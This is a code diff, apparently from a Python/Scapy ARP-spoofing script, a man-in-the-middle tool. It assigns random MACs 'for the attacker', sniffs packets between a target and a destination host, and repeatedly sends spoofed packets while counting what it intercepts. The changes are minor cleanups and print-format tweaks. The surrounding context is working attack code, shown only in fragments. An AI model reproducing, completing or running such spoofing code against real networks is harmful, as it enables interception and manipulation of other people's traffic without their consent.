@@ -20,7 +20,6 @@ print("""
 
 
 def get_mac_from_ip(i_ip):
-    fake_mac = RandMAC()
     foo = '.'.join(i_ip.split('.')[0:3]) + '.0/24'
     fake_ip = str(RandIP(foo))
     fake_ip = IP(src=fake_ip).src
@@ -52,7 +51,7 @@ try:
     T_SRC_MAC = str(RandMAC()) # Fake macs for the attacker
     D_SRC_MAC = str(RandMAC())
     print(f"\nRunning MAC {T_SRC_MAC} for {TRG_IP}")
-    print(f"Running MAC {D_SRC_MAC} for {DST_IP}")
+    print(f"Running MAC {D_SRC_MAC} for {DST_IP}\n")
 except KeyboardInterrupt:
     print("\nKeyboardInterrupt")
     exit()
@@ -81,7 +80,6 @@ def handle_arp(pkt):
 
 def handle_pkt(pkt):
     global pkts_count; pkts_count += 1
-    #if not pkt.haslayer(Ether): print("[!] Packet has no Ether layer\n");pkt.show(); return
     if pkt[0].src not in (TRG_MAC, DST_MAC): return
     if pkt.haslayer(ARP): handle_arp(pkt); return
 
@@ -111,10 +109,10 @@ try:
     while True:
         sendp(pkt1, verbose=0)
         sendp(pkt2, verbose=0)
-        print(f"Total {pkts_count}| {pkts_from_trg} from {TRG_IP} | {pkts_from_dst} from {DST_IP}", end='\r')
+        print(f"Total {pkts_count} | {pkts_from_trg} from {TRG_IP} | {pkts_from_dst} from {DST_IP}", end='\r')
         sleep(0.5)
 except KeyboardInterrupt:
-    print("\nKeyboardInterrupt")
+    print("\n\nKeyboardInterrupt")
     sniffer.stop()
     print(f"Got a total of {pkts_from_trg} packets from {TRG_IP} (Target)")
     print(f"And a total of {pkts_from_dst} packets from {DST_IP} (Destination)")
